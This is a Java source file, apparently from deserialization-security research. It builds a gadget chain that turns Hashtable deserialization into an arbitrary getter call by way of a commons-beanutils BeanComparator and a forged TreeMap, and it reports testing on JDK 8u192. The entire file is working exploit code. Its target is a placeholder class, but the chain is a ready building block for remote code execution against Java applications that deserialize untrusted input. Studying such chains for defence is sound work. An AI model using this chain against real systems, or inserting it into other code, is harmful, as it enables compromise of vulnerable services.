package com.xiinnn.readobject2getter;

import com.xiinnn.template.GetterClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.TreeMap;

// Hashtable#readObject -> getter
// 实测：jdk8u192 commons-beanutils#1.9.2
public class HashtableReadObject2Getter {
    public static void main(String[] args) throws Exception{
        GetterClass getterClass = new GetterClass();

        BeanComparator<Object> comparator = new BeanComparator<>(null, String.CASE_INSENSITIVE_ORDER);
        setFieldValue(comparator, "property", "name");

        HashMap expMap = new HashMap<>();
        expMap.put(getterClass, null);
        TreeMap treeMap = makeTreeMap(comparator);

        HashMap hashMap1 = new HashMap<>();
        hashMap1.put("yy", treeMap);
        hashMap1.put("zZ", expMap);
        HashMap hashMap2 = new HashMap<>();
        hashMap2.put("yy", expMap);
        hashMap2.put("zZ", treeMap);

        byte[] poc = serialize(makeHashtable(hashMap1, hashMap2));
        unserialize(poc);
    }
    public static TreeMap makeTreeMap(Comparator comparator) throws Exception {
        TreeMap treeMap = new TreeMap<>(comparator);
        setFieldValue(treeMap, "size", 1);
        setFieldValue(treeMap, "modCount", 1);
        Class<?> c = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> constructor = c.getDeclaredConstructor(Object.class, Object.class, c);
        constructor.setAccessible(true);
        setFieldValue(treeMap, "root", constructor.newInstance("useless", 1, null));
        return treeMap;
    }
    public static Hashtable makeHashtable(Object v1, Object v2) throws Exception {
        Hashtable hashtable = new Hashtable<>();
        setFieldValue(hashtable, "count", 2);

        Class<?> c = Class.forName("java.util.Hashtable$Entry");
        Constructor<?> constructor = c.getDeclaredConstructor(int.class, Object.class, Object.class, c);
        constructor.setAccessible(true);

        Object tbl = Array.newInstance(c, 2);
        Array.set(tbl, 0, constructor.newInstance(0, v1, 1, null));
        Array.set(tbl, 1, constructor.newInstance(0, v2, 2, null));
        setFieldValue(hashtable, "table", tbl);

        return hashtable;
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
